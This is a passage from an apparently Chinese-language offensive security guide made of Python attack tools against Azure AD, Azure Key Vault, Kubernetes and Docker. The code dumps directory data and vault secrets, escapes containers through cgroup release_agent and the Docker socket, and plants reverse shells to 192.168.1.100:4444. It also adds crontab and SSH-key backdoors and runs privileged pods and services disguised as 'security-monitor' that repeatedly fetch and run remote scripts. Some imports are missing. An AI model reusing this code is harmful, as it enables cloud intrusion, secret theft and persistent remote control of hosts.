from azure.identity import DefaultAzureCredential
from azure.graphrbac import GraphRbacManagementClient
from msgraph import GraphServiceClient
from msgraph.generated.users.users_request_builder import UsersRequestBuilder
import asyncio
import json

class AzureADExploiter:
    def __init__(self, tenant_id, client_id=None, client_secret=None):
        self.tenant_id = tenant_id
        self.client_id = client_id
        self.client_secret = client_secret
        
        # 初始化凭据
        if client_id and client_secret:
            self.credential = DefaultAzureCredential(
                exclude_interactive_browser_credential=False
            )
        else:
            self.credential = DefaultAzureCredential()
        
        # 初始化Graph客户端
        self.graph_client = GraphServiceClient(credentials=self.credential)
    
    async def get_all_users(self):
        """获取所有用户"""
        users = []
        
        try:
            # 获取用户
            request_config = UsersRequestBuilder.UsersRequestBuilderGetRequestConfiguration()
            request_config.query_parameters = UsersRequestBuilder.UsersRequestBuilderGetQueryParameters(
                select=["id", "userPrincipalName", "displayName", "accountEnabled", "createdDateTime"],
                top=999
            )
            
            page_iterator = self.graph_client.users.get(request_configuration=request_config)
            
            while page_iterator:
                page = await page_iterator
                users.extend(page.value)
                
                if page.odata_next_link:
                    page_iterator = self.graph_client.users.with_url(page.odata_next_link).get()
                else:
                    break
            
            print(f"[+] Found {len(users)} users")
            return users
            
        except Exception as e:
            print(f"[!] Error getting users: {e}")
            return []
    
    async def get_all_groups(self):
        """获取所有组"""
        groups = []
        
        try:
            from msgraph.generated.groups.groups_request_builder import GroupsRequestBuilder
            
            request_config = GroupsRequestBuilder.GroupsRequestBuilderGetRequestConfiguration()
            request_config.query_parameters = GroupsRequestBuilder.GroupsRequestBuilderGetQueryParameters(
                select=["id", "displayName", "description", "createdDateTime"],
                top=999
            )
            
            groups_page = await self.graph_client.groups.get(request_configuration=request_config)
            groups.extend(groups_page.value)
            
            print(f"[+] Found {len(groups)} groups")
            return groups
            
        except Exception as e:
            print(f"[!] Error getting groups: {e}")
            return []
    
    async def get_directory_roles(self):
        """获取目录角色"""
        roles = []
        
        try:
            from msgraph.generated.directory_roles.directory_roles_request_builder import DirectoryRolesRequestBuilder
            
            roles_page = await self.graph_client.directory_roles.get()
            roles.extend(roles_page.value)
            
            print(f"[+] Found {len(roles)} directory roles")
            return roles
            
        except Exception as e:
            print(f"[!] Error getting directory roles: {e}")
            return []
    
    async def get_service_principals(self):
        """获取服务主体"""
        service_principals = []
        
        try:
            from msgraph.generated.service_principals.service_principals_request_builder import ServicePrincipalsRequestBuilder
            
            request_config = ServicePrincipalsRequestBuilder.ServicePrincipalsRequestBuilderGetRequestConfiguration()
            request_config.query_parameters = ServicePrincipalsRequestBuilder.ServicePrincipalsRequestBuilderGetQueryParameters(
                select=["id", "appId", "displayName", "createdDateTime"],
                top=999
            )
            
            sp_page = await self.graph_client.service_principals.get(request_configuration=request_config)
            service_principals.extend(sp_page.value)
            
            print(f"[+] Found {len(service_principals)} service principals")
            return service_principals
            
        except Exception as e:
            print(f"[!] Error getting service principals: {e}")
            return []
    
    async def get_conditional_access_policies(self):
        """获取条件访问策略"""
        policies = []
        
        try:
            from msgraph.generated.identity.conditional_access.policies.policies_request_builder import PoliciesRequestBuilder
            
            policies_page = await self.graph_client.identity.conditional_access.policies.get()
            policies.extend(policies_page.value)
            
            print(f"[+] Found {len(policies)} conditional access policies")
            return policies
            
        except Exception as e:
            print(f"[!] Error getting conditional access policies: {e}")
            return []
    
    async def enumerate_privileged_users(self):
        """枚举特权用户"""
        privileged_users = []
        
        try:
            # 获取目录角色
            roles = await self.get_directory_roles()
            
            for role in roles:
                # 获取角色成员
                from msgraph.generated.directory_roles.item.members.members_request_builder import MembersRequestBuilder
                
                members_page = await self.graph_client.directory_roles.by_directory_role_id(role.id).members.get()
                
                for member in members_page.value:
                    privileged_users.append({
                        'user_id': member.id,
                        'user_principal_name': member.user_principal_name,
                        'display_name': member.display_name,
                        'role_id': role.id,
                        'role_display_name': role.display_name
                    })
            
            print(f"[+] Found {len(privileged_users)} privileged users")
            return privileged_users
            
        except Exception as e:
            print(f"[!] Error enumerating privileged users: {e}")
            return []
    
    async def get_oauth2_permission_grants(self):
        """获取OAuth2权限授予"""
        grants = []
        
        try:
            from msgraph.generated.oauth2_permission_grants.oauth2_permission_grants_request_builder import Oauth2PermissionGrantsRequestBuilder
            
            grants_page = await self.graph_client.oauth2_permission_grants.get()
            grants.extend(grants_page.value)
            
            print(f"[+] Found {len(grants)} OAuth2 permission grants")
            return grants
            
        except Exception as e:
            print(f"[!] Error getting OAuth2 permission grants: {e}")
            return []
    
    async def auto_azure_ad_enumeration(self):
        """自动Azure AD枚举"""
        print("[*] Starting automatic Azure AD enumeration...")
        
        enumeration_results = {
            'timestamp': datetime.now().isoformat(),
            'users': await self.get_all_users(),
            'groups': await self.get_all_groups(),
            'directory_roles': await self.get_directory_roles(),
            'service_principals': await self.get_service_principals(),
            'conditional_access_policies': await self.get_conditional_access_policies(),
            'privileged_users': await self.enumerate_privileged_users(),
            'oauth2_permission_grants': await self.get_oauth2_permission_grants()
        }
        
        print("[+] Azure AD enumeration completed")
        return enumeration_results

# 使用示例
async def main():
    azure_ad = AzureADExploiter(
        tenant_id="your-tenant-id",
        client_id="your-client-id",
        client_secret="your-client-secret"
    )
    
    results = await azure_ad.auto_azure_ad_enumeration()
    
    # 保存结果
    with open('azure_ad_enumeration.json', 'w') as f:
        json.dump(results, f, indent=2, default=str)

if __name__ == "__main__":
    asyncio.run(main())
```

### Azure Key Vault利用

#### Key Vault枚举与利用
```python
# azure_keyvault_exploitation.py
from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient
from azure.keyvault.keys import KeyClient
from azure.keyvault.certificates import CertificateClient
from azure.mgmt.keyvault import KeyVaultManagementClient
import asyncio
import json

class AzureKeyVaultExploiter:
    def __init__(self, subscription_id, tenant_id=None):
        self.subscription_id = subscription_id
        self.credential = DefaultAzureCredential()
        self.kv_mgmt_client = KeyVaultManagementClient(self.credential, subscription_id)
        
    def enumerate_key_vaults(self):
        """枚举Key Vault"""
        try:
            vaults = self.kv_mgmt_client.vaults.list()
            vault_list = []
            
            for vault in vaults:
                vault_info = {
                    'name': vault.name,
                    'location': vault.location,
                    'id': vault.id,
                    'vault_uri': vault.properties.vault_uri,
                    'sku': vault.properties.sku.name,
                    'enabled_for_deployment': vault.properties.enabled_for_deployment,
                    'enabled_for_disk_encryption': vault.properties.enabled_for_disk_encryption,
                    'enabled_for_template_deployment': vault.properties.enabled_for_template_deployment,
                    'enable_rbac_authorization': vault.properties.enable_rbac_authorization,
                    'public_network_access': vault.properties.public_network_access
                }
                vault_list.append(vault_info)
            
            print(f"[+] Found {len(vault_list)} Key Vaults")
            return vault_list
            
        except Exception as e:
            print(f"[!] Error enumerating Key Vaults: {e}")
            return []
    
    def extract_secrets(self, vault_uri):
        """提取密钥"""
        try:
            secret_client = SecretClient(vault_url=vault_uri, credential=self.credential)
            
            secrets = []
            for secret_properties in secret_client.list_properties_of_secrets():
                try:
                    secret = secret_client.get_secret(secret_properties.name)
                    secrets.append({
                        'name': secret.name,
                        'value': secret.value,
                        'properties': {
                            'enabled': secret.properties.enabled,
                            'created_on': secret.properties.created_on.isoformat() if secret.properties.created_on else None,
                            'expires_on': secret.properties.expires_on.isoformat() if secret.properties.expires_on else None,
                            'content_type': secret.properties.content_type
                        }
                    })
                except Exception as e:
                    print(f"[!] Error extracting secret {secret_properties.name}: {e}")
            
            print(f"[+] Extracted {len(secrets)} secrets from {vault_uri}")
            return secrets
            
        except Exception as e:
            print(f"[!] Error extracting secrets from {vault_uri}: {e}")
            return []
    
    def extract_keys(self, vault_uri):
        """提取密钥"""
        try:
            key_client = KeyClient(vault_url=vault_uri, credential=self.credential)
            
            keys = []
            for key_properties in key_client.list_properties_of_keys():
                try:
                    key = key_client.get_key(key_properties.name)
                    keys.append({
                        'name': key.name,
                        'key_type': key.key_type,
                        'key_ops': key.key_operations,
                        'properties': {
                            'enabled': key.properties.enabled,
                            'created_on': key.properties.created_on.isoformat() if key.properties.created_on else None,
                            'expires_on': key.properties.expires_on.isoformat() if key.properties.expires_on else None
                        }
                    })
                except Exception as e:
                    print(f"[!] Error extracting key {key_properties.name}: {e}")
            
            print(f"[+] Extracted {len(keys)} keys from {vault_uri}")
            return keys
            
        except Exception as e:
            print(f"[!] Error extracting keys from {vault_uri}: {e}")
            return []
    
    def extract_certificates(self, vault_uri):
        """提取证书"""
        try:
            cert_client = CertificateClient(vault_url=vault_uri, credential=self.credential)
            
            certificates = []
            for cert_properties in cert_client.list_properties_of_certificates():
                try:
                    cert = cert_client.get_certificate(cert_properties.name)
                    certificates.append({
                        'name': cert.name,
                        'cer': base64.b64encode(cert.cer).decode() if cert.cer else None,
                        'properties': {
                            'enabled': cert.properties.enabled,
                            'created_on': cert.properties.created_on.isoformat() if cert.properties.created_on else None,
                            'expires_on': cert.properties.expires_on.isoformat() if cert.properties.expires_on else None,
                            'subject': cert.properties.subject,
                            'issuer': cert.properties.issuer,
                            'thumbprint': cert.properties.x509_thumbprint.hex() if cert.properties.x509_thumbprint else None
                        }
                    })
                except Exception as e:
                    print(f"[!] Error extracting certificate {cert_properties.name}: {e}")
            
            print(f"[+] Extracted {len(certificates)} certificates from {vault_uri}")
            return certificates
            
        except Exception as e:
            print(f"[!] Error extracting certificates from {vault_uri}: {e}")
            return []
    
    def get_key_vault_access_policies(self, vault_name, resource_group):
        """获取Key Vault访问策略"""
        try:
            vault = self.kv_mgmt_client.vaults.get(resource_group, vault_name)
            
            access_policies = []
            for policy in vault.properties.access_policies:
                policy_info = {
                    'tenant_id': policy.tenant_id,
                    'object_id': policy.object_id,
                    'permissions': {
                        'keys': policy.permissions.keys,
                        'secrets': policy.permissions.secrets,
                        'certificates': policy.permissions.certificates,
                        'storage': policy.permissions.storage
                    }
                }
                access_policies.append(policy_info)
            
            return access_policies
            
        except Exception as e:
            print(f"[!] Error getting access policies for {vault_name}: {e}")
            return []
    
    def auto_keyvault_exploitation(self):
        """自动Key Vault利用"""
        print("[*] Starting automatic Key Vault exploitation...")
        
        exploitation_results = {
            'timestamp': datetime.now().isoformat(),
            'vaults': []
        }
        
        # 1. 枚举Key Vault
        vaults = self.enumerate_key_vaults()
        
        for vault in vaults:
            vault_result = {
                'vault_info': vault,
                'secrets': [],
                'keys': [],
                'certificates': [],
                'access_policies': []
            }
            
            print(f"\n[*] Processing vault: {vault['name']}")
            
            # 2. 提取访问策略
            resource_group = vault['id'].split('/')[4]
            access_policies = self.get_key_vault_access_policies(vault['name'], resource_group)
            vault_result['access_policies'] = access_policies
            
            # 3. 尝试提取密钥
            try:
                secrets = self.extract_secrets(vault['vault_uri'])
                vault_result['secrets'] = secrets
            except Exception as e:
                print(f"[!] Failed to extract secrets: {e}")
            
            # 4. 尝试提取密钥
            try:
                keys = self.extract_keys(vault['vault_uri'])
                vault_result['keys'] = keys
            except Exception as e:
                print(f"[!] Failed to extract keys: {e}")
            
            # 5. 尝试提取证书
            try:
                certificates = self.extract_certificates(vault['vault_uri'])
                vault_result['certificates'] = certificates
            except Exception as e:
                print(f"[!] Failed to extract certificates: {e}")
            
            exploitation_results['vaults'].append(vault_result)
        
        print("[+] Key Vault exploitation completed")
        return exploitation_results

# 使用示例
keyvault_exploiter = AzureKeyVaultExploiter(
    subscription_id="your-subscription-id",
    tenant_id="your-tenant-id"
)

results = keyvault_exploiter.auto_keyvault_exploitation()

# 保存结果
with open('azure_keyvault_exploitation.json', 'w') as f:
    json.dump(results, f, indent=2, default=str)
```

---

## Kubernetes攻防

### Pod逃逸

#### 容器逃逸技术
```python
# kubernetes_pod_escape.py
import os
import subprocess
import requests
import json
from pathlib import Path

class KubernetesPodEscaper:
    def __init__(self):
        self.container_info = {}
        self.host_filesystem = False
        self.service_account = False
        self.privileged = False
    
    def detect_container_environment(self):
        """检测容器环境"""
        print("[*] Detecting container environment...")
        
        # 检查是否在容器中
        if os.path.exists('/.dockerenv'):
            self.container_info['dockerenv'] = True
        
        # 检查cgroups
        try:
            with open('/proc/1/cgroup', 'r') as f:
                cgroup_content = f.read()
                if 'docker' in cgroup_content or 'kubepods' in cgroup_content:
                    self.container_info['container_type'] = 'docker/kubernetes'
        except:
            pass
        
        # 检查进程
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            if 'containerd' in result.stdout or 'docker' in result.stdout:
                self.container_info['container_runtime'] = True
        except:
            pass
        
        # 检查挂载
        try:
            with open('/proc/self/mountinfo', 'r') as f:
                mounts = f.read()
                if 'overlay' in mounts:
                    self.container_info['overlayfs'] = True
        except:
            pass
        
        print(f"[+] Container info: {self.container_info}")
        return self.container_info
    
    def check_privileged_mode(self):
        """检查是否以特权模式运行"""
        print("[*] Checking privileged mode...")
        
        try:
            # 尝试访问通常受限制的文件
            restricted_files = ['/proc/kcore', '/dev/mem', '/sys/kernel/debug']
            accessible_files = []
            
            for file_path in restricted_files:
                if os.path.exists(file_path) and os.access(file_path, os.R_OK):
                    accessible_files.append(file_path)
            
            if accessible_files:
                self.privileged = True
                print(f"[+] Privileged mode detected! Accessible files: {accessible_files}")
            else:
                print("[-] Not in privileged mode")
                
        except Exception as e:
            print(f"[!] Error checking privileged mode: {e}")
        
        return self.privileged
    
    def check_host_filesystem_access(self):
        """检查宿主机文件系统访问"""
        print("[*] Checking host filesystem access...")
        
        # 检查常见的宿主机挂载点
        host_mounts = [
            '/host',
            '/host_proc',
            '/host_sys',
            '/host_dev',
            '/host_etc'
        ]
        
        accessible_mounts = []
        
        for mount in host_mounts:
            if os.path.exists(mount):
                accessible_mounts.append(mount)
        
        # 检查/proc挂载
        try:
            with open('/proc/self/mountinfo', 'r') as f:
                mount_info = f.read()
                
            # 查找宿主机挂载
            if '/proc' in mount_info and 'proc' not in mount_info.split('/proc')[1].split()[0]:
                self.host_filesystem = True
                accessible_mounts.append('/proc (host)')
        except:
            pass
        
        if accessible_mounts:
            self.host_filesystem = True
            print(f"[+] Host filesystem access detected: {accessible_mounts}")
        else:
            print("[-] No host filesystem access detected")
        
        return self.host_filesystem
    
    def check_service_account_access(self):
        """检查服务账户访问"""
        print("[*] Checking service account access...")
        
        # Kubernetes服务账户路径
        k8s_sa_path = '/var/run/secrets/kubernetes.io/serviceaccount'
        
        if os.path.exists(k8s_sa_path):
            self.service_account = True
            print(f"[+] Kubernetes service account found: {k8s_sa_path}")
            
            # 读取服务账户信息
            try:
                with open(os.path.join(k8s_sa_path, 'token'), 'r') as f:
                    token = f.read()
                    print(f"[+] Service account token found (length: {len(token)})")
                
                with open(os.path.join(k8s_sa_path, 'namespace'), 'r') as f:
                    namespace = f.read()
                    print(f"[+] Namespace: {namespace}")
                
                with open(os.path.join(k8s_sa_path, 'ca.crt'), 'r') as f:
                    ca_cert = f.read()
                    print(f"[+] CA certificate found (length: {len(ca_cert)})")
                    
            except Exception as e:
                print(f"[!] Error reading service account info: {e}")
        else:
            print("[-] No Kubernetes service account found")
        
        return self.service_account
    
    def exploit_docker_socket(self):
        """利用Docker Socket"""
        print("[*] Checking for Docker socket...")
        
        docker_socket = '/var/run/docker.sock'
        
        if os.path.exists(docker_socket):
            print(f"[+] Docker socket found: {docker_socket}")
            
            try:
                # 检查socket是否可访问
                import socket
                s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                s.connect(docker_socket)
                s.close()
                
                print("[+] Docker socket is accessible!")
                
                # 可以尝试通过socket与Docker API通信
                return True
                
            except Exception as e:
                print(f"[!] Docker socket not accessible: {e}")
                return False
        else:
            print("[-] Docker socket not found")
            return False
    
    def exploit_cgroup_release_agent(self):
        """利用cgroup release_agent"""
        print("[*] Attempting cgroup release_agent exploitation...")
        
        try:
            # 检查cgroup版本
            cgroup_version = self.detect_cgroup_version()
            
            if cgroup_version == 1:
                return self.exploit_cgroup_v1()
            elif cgroup_version == 2:
                return self.exploit_cgroup_v2()
            else:
                print("[!] Unknown cgroup version")
                return False
                
        except Exception as e:
            print(f"[!] Error in cgroup exploitation: {e}")
            return False
    
    def detect_cgroup_version(self):
        """检测cgroup版本"""
        try:
            # 检查cgroup v1
            if os.path.exists('/sys/fs/cgroup/cgroup.controllers'):
                return 2
            elif os.path.exists('/sys/fs/cgroup/release_agent'):
                return 1
            else:
                return 0
        except:
            return 0
    
    def exploit_cgroup_v1(self):
        """利用cgroup v1"""
        print("[*] Exploiting cgroup v1...")
        
        try:
            # 创建新的cgroup
            cgroup_path = '/sys/fs/cgroup/x'
            os.makedirs(cgroup_path, exist_ok=True)
            
            # 设置release_agent
            with open('/sys/fs/cgroup/release_agent', 'w') as f:
                f.write('/tmp/payload.sh')
            
            # 创建payload
            payload_script = '''#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
'''
            
            with open('/tmp/payload.sh', 'w') as f:
                f.write(payload_script)
            
            os.chmod('/tmp/payload.sh', 0o755)
            
            # 触发release_agent
            with open(f'{cgroup_path}/cgroup.procs', 'w') as f:
                f.write('1')
            
            print("[+] Cgroup v1 exploitation completed")
            return True
            
        except Exception as e:
            print(f"[!] Cgroup v1 exploitation failed: {e}")
            return False
    
    def exploit_cgroup_v2(self):
        """利用cgroup v2"""
        print("[*] Exploiting cgroup v2...")
        
        try:
            # cgroup v2利用方法
            cgroup_path = '/sys/fs/cgroup'
            
            # 检查是否可写
            if not os.access(cgroup_path, os.W_OK):
                print("[!] Cgroup directory not writable")
                return False
            
            # 创建子cgroup
            sub_cgroup = f'{cgroup_path}/escape'
            os.makedirs(sub_cgroup, exist_ok=True)
            
            # 启用所有控制器
            with open(f'{cgroup_path}/cgroup.subtree_control', 'w') as f:
                f.write('+cpu +memory +pids')
            
            print("[+] Cgroup v2 exploitation setup completed")
            return True
            
        except Exception as e:
            print(f"[!] Cgroup v2 exploitation failed: {e}")
            return False
    
    def exploit_sys_admin_capability(self):
        """利用SYS_ADMIN capability"""
        print("[*] Checking for SYS_ADMIN capability...")
        
        try:
            # 检查capabilities
            result = subprocess.run(['getcap', '-r', '/'], capture_output=True, text=True)
            
            if 'cap_sys_admin' in result.stdout:
                print("[+] SYS_ADMIN capability found!")
                
                # 可以尝试挂载操作
                return True
            else:
                print("[-] No SYS_ADMIN capability found")
                return False
                
        except FileNotFoundError:
            print("[!] getcap command not found")
            return False
    
    def exploit_kubernetes_api(self):
        """利用Kubernetes API"""
        print("[*] Attempting Kubernetes API exploitation...")
        
        if not self.service_account:
            print("[!] No service account available")
            return False
        
        try:
            # 读取服务账户token
            with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
                token = f.read().strip()
            
            # 读取CA证书
            with open('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt', 'r') as f:
                ca_cert = f.read()
            
            # 读取命名空间
            with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
                namespace = f.read().strip()
            
            # Kubernetes API服务器地址
            api_server = "https://kubernetes.default.svc"
            
            # 设置请求头
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            
            # 测试API访问
            response = requests.get(
                f"{api_server}/api/v1/namespaces/{namespace}/pods",
                headers=headers,
                verify=False,  # 在生产环境中应该验证证书
                timeout=10
            )
            
            if response.status_code == 200:
                print("[+] Kubernetes API access successful!")
                
                pods = response.json()
                print(f"[+] Found {len(pods['items'])} pods in namespace {namespace}")
                
                return True
            else:
                print(f"[!] Kubernetes API access failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[!] Kubernetes API exploitation error: {e}")
            return False
    
    def create_malicious_pod(self):
        """创建恶意Pod"""
        print("[*] Creating malicious pod...")
        
        if not self.service_account:
            print("[!] No service account available")
            return False
        
        try:
            # 读取token
            with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:
                token = f.read().strip()
            
            # 读取命名空间
            with open('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'r') as f:
                namespace = f.read().strip()
            
            # 恶意Pod定义
            malicious_pod = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {
                    "name": "security-monitor",
                    "namespace": namespace
                },
                "spec": {
                    "containers": [{
                        "name": "monitor",
                        "image": "alpine:latest",
                        "command": ["/bin/sh", "-c"],
                        "args": [
                            "apk add --no-cache curl && "
                            "while true; do "
                            "curl -s http://192.168.1.100:8080/k8s-payload.sh | sh; "
                            "sleep 3600; "
                            "done"
                        ],
                        "securityContext": {
                            "privileged": True,
                            "runAsUser": 0
                        }
                    }],
                    "serviceAccountName": "default",
                    "restartPolicy": "Always"
                }
            }
            
            # 发送创建Pod请求
            api_server = "https://kubernetes.default.svc"
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            
            response = requests.post(
                f"{api_server}/api/v1/namespaces/{namespace}/pods",
                headers=headers,
                json=malicious_pod,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 201:
                print("[+] Malicious pod created successfully!")
                return True
            else:
                print(f"[!] Failed to create malicious pod: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[!] Error creating malicious pod: {e}")
            return False
    
    def auto_pod_escape(self):
        """自动Pod逃逸"""
        print("[*] Starting automatic pod escape...")
        
        # 1. 检测容器环境
        self.detect_container_environment()
        
        # 2. 检查各种逃逸条件
        escape_methods = []
        
        if self.check_privileged_mode():
            escape_methods.append('privileged_mode')
        
        if self.check_host_filesystem_access():
            escape_methods.append('host_filesystem')
        
        if self.check_service_account_access():
            escape_methods.append('service_account')
        
        if self.exploit_docker_socket():
            escape_methods.append('docker_socket')
        
        if self.exploit_cgroup_release_agent():
            escape_methods.append('cgroup_release_agent')
        
        if self.exploit_sys_admin_capability():
            escape_methods.append('sys_admin_capability')
        
        print(f"[+] Available escape methods: {escape_methods}")
        
        # 3. 执行逃逸
        if 'service_account' in escape_methods:
            print("[*] Attempting Kubernetes API exploitation...")
            if self.exploit_kubernetes_api():
                print("[+] Kubernetes API exploitation successful")
                
                print("[*] Creating malicious pod...")
                if self.create_malicious_pod():
                    print("[+] Malicious pod created successfully")
        
        if 'privileged_mode' in escape_methods:
            print("[*] Leveraging privileged mode...")
            # 执行特权操作
        
        if 'docker_socket' in escape_methods:
            print("[*] Leveraging Docker socket...")
            # 通过Docker API逃逸
        
        print("[+] Pod escape sequence completed")
        return escape_methods

# 使用示例
pod_escaper = KubernetesPodEscaper()
pod_escaper.auto_pod_escape()
```

---

## Docker容器安全

### 容器逃逸检测

#### Docker Socket利用
```python
# docker_socket_exploitation.py
import docker
import requests
import json
import tempfile
import os

class DockerSocketExploiter:
    def __init__(self, socket_path="/var/run/docker.sock"):
        self.socket_path = socket_path
        self.docker_client = None
        self.is_accessible = False
    
    def check_docker_socket(self):
        """检查Docker Socket可访问性"""
        print(f"[*] Checking Docker Socket: {self.socket_path}")
        
        try:
            # 尝试创建Docker客户端
            self.docker_client = docker.DockerClient(base_url=f"unix://{self.socket_path}")
            
            # 测试连接
            version = self.docker_client.version()
            self.is_accessible = True
            
            print(f"[+] Docker Socket is accessible!")
            print(f"[+] Docker version: {version['Version']}")
            print(f"[+] API version: {version['ApiVersion']}")
            
            return True
            
        except docker.errors.DockerException as e:
            print(f"[!] Docker Socket not accessible: {e}")
            return False
    
    def enumerate_containers(self):
        """枚举容器"""
        if not self.is_accessible:
            return []
        
        try:
            containers = self.docker_client.containers.list(all=True)
            
            container_info = []
            for container in containers:
                info = {
                    'id': container.id[:12],
                    'name': container.name,
                    'image': container.image.tags[0] if container.image.tags else container.image.id[:12],
                    'status': container.status,
                    'ports': container.ports,
                    'labels': container.labels,
                    'created': container.attrs['Created']
                }
                container_info.append(info)
            
            print(f"[+] Found {len(container_info)} containers")
            return container_info
            
        except Exception as e:
            print(f"[!] Error enumerating containers: {e}")
            return []
    
    def enumerate_images(self):
        """枚举镜像"""
        if not self.is_accessible:
            return []
        
        try:
            images = self.docker_client.images.list()
            
            image_info = []
            for image in images:
                info = {
                    'id': image.id[:12],
                    'tags': image.tags,
                    'created': image.attrs['Created'],
                    'size': image.attrs['Size'],
                    'labels': image.labels
                }
                image_info.append(info)
            
            print(f"[+] Found {len(image_info)} images")
            return image_info
            
        except Exception as e:
            print(f"[!] Error enumerating images: {e}")
            return []
    
    def create_privileged_container(self, image="alpine:latest", command="/bin/sh"):
        """创建特权容器"""
        if not self.is_accessible:
            return None
        
        try:
            # 创建特权容器
            container = self.docker_client.containers.run(
                image=image,
                command=command,
                detach=True,
                tty=True,
                stdin_open=True,
                privileged=True,
                volumes={
                    '/': {'bind': '/host', 'mode': 'rw'},
                    '/var/run/docker.sock': {'bind': '/var/run/docker.sock', 'mode': 'rw'}
                },
                name=f"escape-{os.getpid()}",
                remove=True
            )
            
            print(f"[+] Privileged container created: {container.id[:12]}")
            return container
            
        except Exception as e:
            print(f"[!] Error creating privileged container: {e}")
            return None
    
    def escape_via_container_creation(self):
        """通过容器创建逃逸"""
        print("[*] Attempting escape via container creation...")
        
        # 创建逃逸脚本
        escape_script = """#!/bin/sh
# Docker escape script

# 挂载宿主机文件系统
mkdir -p /host_root
mount /dev/sda1 /host_root 2>/dev/null || mount /dev/xvda1 /host_root 2>/dev/null

# 创建后门
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /host_root/tmp/backdoor.sh
chmod +x /host_root/tmp/backdoor.sh

# 添加crontab
echo "* * * * * root /tmp/backdoor.sh" >> /host_root/etc/crontab

echo "[+] Escape completed"
"""
        
        # 创建临时文件
        with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
            f.write(escape_script)
            script_path = f.name
        
        try:
            # 创建容器并执行逃逸脚本
            container = self.docker_client.containers.run(
                image="alpine:latest",
                command=f"/bin/sh -c 'chmod +x /tmp/escape.sh && /tmp/escape.sh'",
                detach=True,
                remove=True,
                volumes={
                    '/': {'bind': '/host_root', 'mode': 'rw'},
                    script_path: {'bind': '/tmp/escape.sh', 'mode': 'ro'}
                },
                privileged=True
            )
            
            # 等待容器完成
            result = container.wait()
            logs = container.logs().decode()
            
            print(f"[+] Container escape result: {logs}")
            return True
            
        except Exception as e:
            print(f"[!] Container escape failed: {e}")
            return False
        finally:
            os.unlink(script_path)
    
    def escape_via_image_manipulation(self):
        """通过镜像操作逃逸"""
        print("[*] Attempting escape via image manipulation...")
        
        try:
            # 创建恶意Dockerfile
            dockerfile_content = """
FROM alpine:latest
RUN apk add --no-cache bash curl

# 创建后门
RUN echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /root/backdoor.sh && \
    chmod +x /root/backdoor.sh && \
    echo "@reboot root /root/backdoor.sh" >> /etc/crontab

# 添加SSH密钥
RUN mkdir -p /root/.ssh && \
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... redteam@target" > /root/.ssh/authorized_keys

CMD ["/bin/sh"]
"""
            
            # 创建临时Dockerfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.dockerfile', delete=False) as f:
                f.write(dockerfile_content)
                dockerfile_path = f.name
            
            # 构建镜像
            image_tag = "security/alpine:latest"
            
            print(f"[*] Building malicious image: {image_tag}")
            
            # 使用低层API构建镜像
            with open(dockerfile_path, 'rb') as f:
                dockerfile_data = f.read()
            
            # 构建镜像
            image = self.docker_client.images.build(
                fileobj=dockerfile_data,
                tag=image_tag,
                rm=True
            )
            
            print(f"[+] Malicious image built: {image.tags}")
            
            # 运行镜像
            container = self.docker_client.containers.run(
                image=image_tag,
                command="/bin/sh -c '/root/backdoor.sh'",
                detach=True,
                remove=True,
                privileged=True,
                volumes={'/': {'bind': '/host', 'mode': 'rw'}}
            )
            
            print("[+] Malicious container started")
            return True
            
        except Exception as e:
            print(f"[!] Image manipulation escape failed: {e}")
            return False
        finally:
            if 'dockerfile_path' in locals():
                os.unlink(dockerfile_path)
    
    def enumerate_docker_secrets(self):
        """枚举Docker密钥"""
        if not self.is_accessible:
            return []
        
        try:
            # 获取所有密钥
            secrets = self.docker_client.secrets.list()
            
            secret_info = []
            for secret in secrets:
                info = {
                    'id': secret.id[:12],
                    'name': secret.name,
                    'created': secret.attrs['CreatedAt'],
                    'updated': secret.attrs['UpdatedAt']
                }
                secret_info.append(info)
            
            print(f"[+] Found {len(secret_info)} Docker secrets")
            return secret_info
            
        except Exception as e:
            print(f"[!] Error enumerating Docker secrets: {e}")
            return []
    
    def create_docker_backdoor_service(self):
        """创建Docker后门服务"""
        print("[*] Creating Docker backdoor service...")
        
        try:
            # 服务定义
            service_definition = {
                'image': 'alpine:latest',
                'command': '/bin/sh -c "while true; do curl -s http://192.168.1.100:8080/docker-payload.sh | sh; sleep 3600; done"',
                'name': 'security-monitor',
                'restart_policy': {'Condition': 'always'},
                'resources': {
                    'limits': {
                        'memory': 128 * 1024 * 1024,  # 128MB
                        'cpus': 0.1
                    }
                },
                'mounts': [
                    {
                        'type': 'bind',
                        'source': '/',
                        'target': '/host',
                        'read_only': False
                    }
                ],
                'privileged': True,
                'labels': {
                    'com.docker.service.name': 'security-monitor',
                    'com.docker.service.description': 'Security monitoring service'
                }
            }
            
            # 创建服务
            service = self.docker_client.services.create(**service_definition)
            
            print(f"[+] Docker backdoor service created: {service.id[:12]}")
            return service
            
        except Exception as e:
            print(f"[!] Error creating Docker backdoor service: {e}")
            return None
    
    def auto_docker_exploitation(self):
        """自动Docker利用"""
        print("[*] Starting automatic Docker exploitation...")
        
        # 1. 检查Docker Socket访问
        if not self.check_docker_socket():
            print("[!] Docker Socket not accessible")
            return False
        
        # 2. 枚举资源
        containers = self.enumerate_containers()
        images = self.enumerate_images()
        secrets = self.enumerate_docker_secrets()
        
        print(f"[+] Found {len(containers)} containers, {len(images)} images, {len(secrets)} secrets")
        
        # 3. 尝试容器逃逸
        escape_methods = []
        
        if self.create_privileged_container():
            escape_methods.append('privileged_container')
        
        if self.escape_via_container_creation():
